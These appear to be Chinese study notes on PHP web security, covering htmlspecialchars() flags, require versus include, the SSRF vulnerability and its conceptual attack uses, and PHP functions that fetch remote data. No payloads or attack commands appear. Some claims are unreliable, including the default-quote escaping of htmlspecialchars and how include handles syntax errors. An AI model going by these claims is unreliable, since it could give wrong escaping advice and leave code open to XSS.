.htmlspecialchars()

htmlspecialchars()把预定义的字符转换为 HTML 实体

预转义的字符：

  • string：必需，规定要转换的字符串
  • flags ：可选，规定如何处理引号、无效的编码以及使用哪种文档类型
  • character-set ：可选，一个规定了要使用的字符集的字符串，如：UTF-8（默认）
  • double_encode ：可选，布尔值，规定了是否编码已存在的 HTML 实体。

flags不设置时默认只转义双引号

对于flags:

  • ENT_COMPAT ：默认仅编码双引号。
  • ENT_QUOTES：编码双引号和单引号。
  • ENT_NOQUOTES：不编码任何引号。

require 函数与 include 函数类似，但它们之间一些重要的区别：

  • require 函数会在引入文件之前检查文件是否存在，如果文件不存在，则会导致致命错误并停止脚本的执行。而 include 函数只会发出警告并继续执行脚本。
  • require 函数引入的文件必须是有效的 PHP 代码，否则会导致语法错误并停止脚本的执行。而 include 函数只会发出警告并继续执行脚本。

SSRF

SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制

导致攻击者去伪造请求让服务器去发起请求，通过目标服务器去访问别的服务器或者是自身的内容

有点类似于CSRF但是这是服务器去请求。如果没有进行严格的过滤就有可能造成:

  • 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。
  • 攻击运行在内网或本地的应用程序。
  • 对内网Web应用进行指纹识别，识别企业内部的资产信息。
  • 攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。
  • 利用file协议读取本地文件等。

这三个函数在PHP中用于从远程服务器获取数据或与远程服务器通信。

  1. file_get_contents(): 这个函数用于将整个文件读入一个字符串中。它可以用来获取远程服务器上的文件内容，例如网页内容或 API 响应。使用该函数时需要确保 PHP 配置中允许打开远程文件。

  2. fsockopen(): 这个函数用于在网络上打开一个 socket 连接。它可以用于通过 TCP 或 UDP 与远程服务器进行通信。通过这个函数，你可以手动构建和发送 HTTP 请求，以及处理服务器响应。

  3. curl_exec(): 这个函数是通过 cURL 库执行一个请求，并返回结果。cURL 是一个功能强大的工具，用于在不同协议下传输数据。curl_exec() 可以用来向服务器发送请求并获取响应，支持的协议包括 HTTP、HTTPS、FTP 等。

这些函数都可以用于从远程服务器获取数据或与远程服务器进行通信，但各自的使用场景和功能略有不同。
